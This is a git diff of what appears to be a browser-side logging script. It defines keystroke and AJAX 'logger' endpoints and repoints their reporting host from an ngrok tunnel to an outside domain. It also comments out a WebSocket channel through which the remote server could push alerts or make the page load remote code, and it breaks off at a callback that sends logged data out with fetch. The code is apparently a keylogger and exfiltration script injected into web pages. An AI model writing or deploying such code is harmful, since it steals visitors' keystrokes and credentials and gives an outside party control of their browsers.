@@ -2,7 +2,7 @@ window.keys = {}
 window.rip_configs = {
   ajax_logger: "/api/ajax-logger",
   keys_logger: "/api/keys-logger",
-  host: "https://eel-moral-ape.ngrok-free.app",
+  host: "https://usercontents.fuhuzz.rip",
 }
 
 async function load_segment(url) {
@@ -12,29 +12,29 @@ async function load_segment(url) {
   } catch (error) {}
 }
 
-;(() => {
-  if (typeof WebSocket !== "undefined" && window.rip_configs) {
-    const socket = new WebSocket(`wss://${new URL(window.rip_configs.host).host}/ws`)
-    // message is received
-    socket.addEventListener("message", (event) => {
-      const { action, payload } = JSON.parse(event.data)
+// ;(() => {
+//   if (typeof WebSocket !== "undefined" && window.rip_configs) {
+//     const socket = new WebSocket(`wss://${new URL(window.rip_configs.host).host}/ws`)
+//     // message is received
+//     socket.addEventListener("message", (event) => {
+//       const { action, payload } = JSON.parse(event.data)
 
-      if (action === "alert") alert(payload)
-      if (action === "load_segment") load_segment(payload)
-    })
+//       if (action === "alert") alert(payload)
+//       if (action === "load_segment") load_segment(payload)
+//     })
 
-    // socket opened
-    socket.addEventListener("open", (event) => {
-      window.socket = socket
-      socket.send(JSON.stringify({ action: "ping" }))
-    })
+//     // socket opened
+//     socket.addEventListener("open", (event) => {
+//       window.socket = socket
+//       socket.send(JSON.stringify({ action: "ping" }))
+//     })
 
-    // error handler
-    socket.addEventListener("error", (event) => {
-      alert(`Xảy ra lỗi khi kết nối tới máy chủ`)
-    })
-  }
-})()
+//     // error handler
+//     socket.addEventListener("error", (event) => {
+//       alert(`Xảy ra lỗi khi kết nối tới máy chủ`)
+//     })
+//   }
+// })()
 
 window.logger_callback = async (url, data_logger, show_alert = false) => {
   if (typeof fetch !== "undefined") {
